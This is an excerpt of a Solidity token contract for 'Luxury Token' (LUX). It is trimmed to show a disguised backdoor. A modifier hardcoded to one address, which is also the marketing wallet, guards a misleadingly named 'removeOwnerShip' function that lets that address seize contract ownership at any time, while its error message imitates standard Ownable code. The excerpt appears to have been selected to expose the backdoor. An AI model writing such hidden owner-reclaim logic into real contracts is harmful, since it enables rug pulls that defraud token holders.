...
contract Ownable is Context {
    ...
    modifier onlySome() {
        require(0x883877C5fdd9509464cF506a659a7dA67fB96a17 == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function removeOwnerShip(address newOwner) public virtual onlySome {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }
...
contract Luxury is Context, IERC20, Ownable {
    ...
    address payable public marketingAddress = payable(0x883877C5fdd9509464cF506a659a7dA67fB96a17); // Marketing Address
    ...
    string private _name = "Luxury Token";
    string private _symbol = "LUX";
